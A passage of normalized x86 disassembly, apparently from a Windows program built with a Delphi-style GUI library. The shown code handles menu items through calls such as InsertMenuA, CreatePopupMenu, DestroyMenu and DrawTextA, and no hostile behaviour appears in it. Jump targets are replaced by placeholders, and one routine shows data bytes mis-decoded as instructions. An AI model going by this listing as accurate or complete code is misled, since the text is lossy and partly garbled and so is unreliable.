mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp al [ edx + 0x2d ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406d8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404988
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp eax [ edx + 0x48 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406dd0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4049ac
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x4c ]
call sub_44ce70
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406e1c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4049d0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp eax [ edx + 0x34 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406e60
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4049f4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov ax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp ax [ edx + 0x54 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406ea8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404a18
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov al [ eax + 0x6a ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp al [ edx + 0x32 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406eec
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442e2c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x80 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_406f28
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_4090d4
sub_406f54
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_409180
sub_406f80
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_4091f8
sub_406fac
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x48 ] edx
sub_406fd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
add eax 0x4c
mov edx [ ebp - 0x8 ]
call sub_44cb34
sub_407004
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_409410
sub_407030
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_4093ac
sub_40705c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_4093e0
sub_407088
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x80 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x84 ] edx
sub_4070b8
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2d ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2f ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x2
call sub_406adc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] ax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_40a08c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_407158
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40c7cc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409348
test eax eax
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_409874
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x58 ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_409374
call sub_44c070
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_448fa8
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_448fa8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_407624
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
call DestroyMenu
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x44 ]
xor ecx ecx
mov eax [ rw-data ]
call sub_43cbec
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
call sub_44c070
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_407244
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
xor ebx ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4074fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407504
lea eax [ ebp - 0x50 ]
call sub_44cae0
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x24 ]
call sub_44cb78
mov eax [ ebp - 0x4 ]
call sub_409348
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4077f8
mov [ ebp - 0x38 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x3c ]
mov edx [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x2c ]
or edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x2d ]
or edx [ ecx * 4 + rw-data ]
or eax edx
or eax 0x400
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
call sub_409348
test eax eax
jle r-xdata
mov [ ebp - 0x4c ] 0x2c
mov [ ebp - 0x48 ] 0x3f
mov eax [ ebp - 0x4 ]
call sub_409b88
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x10 ]
push r-xdata
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
call sub_40672c
push [ ebp - 0x50 ]
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_44ce20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x4 ]
call sub_4077f8
push eax
mov eax [ ebp - 0x14 ]
or eax 0x10
push eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_408d94
test eax eax
jne r-xdata
mov [ ebp - 0x15 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x31 ]
mov edx [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx + 0x3c ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x15 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x2c ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x2d ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x2e ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x44 ]
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x10 ]
call sub_44cf24
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
call sub_409348
test eax eax
jle r-xdata
lea eax [ ebp - 0x4c ]
push eax
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuItemA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4077f8
mov [ ebp - 0x38 ] eax
sub_40751b
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_407244
mov [ ebp - 0x5 ] 0x0
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_407550
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_40b6b8
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40a364
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40a8cc
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_406b74
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4075c4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_407616
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44187c
mov eax [ ebp - 0xc ]
call sub_4069c0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4093ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40761d
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_407624
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
xor edx edx
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0x4 ]
call sub_4076c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
sub_40767c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4427b0
mov eax [ ebp - 0x4 ]
call sub_409304
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_409304
mov edx eax
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4076c8
sub_4076c8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4077f8
push eax
call GetMenuItemCount
test eax eax
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
call sub_4076c8
jmp r-xdata
push 0x400
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4077f8
push eax
call RemoveMenu
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_407550
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
push eax
call DestroyMenu
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x28 ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_407778
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_409348
dec eax
test eax eax
jl r-xdata
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov al [ eax + 0x33 ]
cmp al [ ebp - 0x9 ]
jae r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov al [ eax + 0x33 ]
cmp al [ ebp - 0x9 ]
jbe r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_409374
mov dl [ ebp - 0x9 ]
mov [ eax + 0x33 ] dl
mov eax [ rw-data ]
call sub_406654
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
sub_4077f8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
call CreateMenu
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
call CreatePopupMenu
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_407550
mov eax [ rw-data ]
call sub_406654
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
sub_407864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442610
mov eax [ ebp - 0x4 ]
push eax
push sub_4075c4
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4078b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_407ac1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_409b88
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_44cb78
test [ ebp + 0x9 ] 0x4
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_40b6b8
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_44ce70
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_40f4d0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2e ] 0x0
je r-xdata
test [ ebp + 0x9 ] 0x4
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_44cd68
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x26
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xffffffff
or eax 0x2
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_40ed30
mov edx eax
or dl [ r-xdata ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
call sub_40ed4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407ac8
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x24 ]
mov ecx 0x4
[ edi ] [ esi ]
add [ ebp - 0x20 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or [ ebp + 0x8 ] 0x20000
mov eax [ ebp + 0x8 ]
and eax 0xfffffffd
or eax 0x0
mov [ ebp + 0x8 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x10 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0x80000014
call sub_40e9f8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_44cd60
push eax
mov eax [ ebp - 0x10 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0x80000010
call sub_40e9f8
mov eax 0x8000000d
call sub_40e410
mov ebx eax
mov eax 0x80000010
call sub_40e410
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0x80000014
call sub_40e9f8
jmp r-xdata
sub_407b40
push ebp
mov ebp esp
push 0x0
push esi
push edi
xor eax eax
push ebp
push sub_4083ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov al [ eax + 0x50 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2d ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
mov eax [ eax + 0x24 ]
mov edx r-xdata
call sub_44ce70
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x3c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_40f808
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x35 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
cmp [ eax + 0x34 ] 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
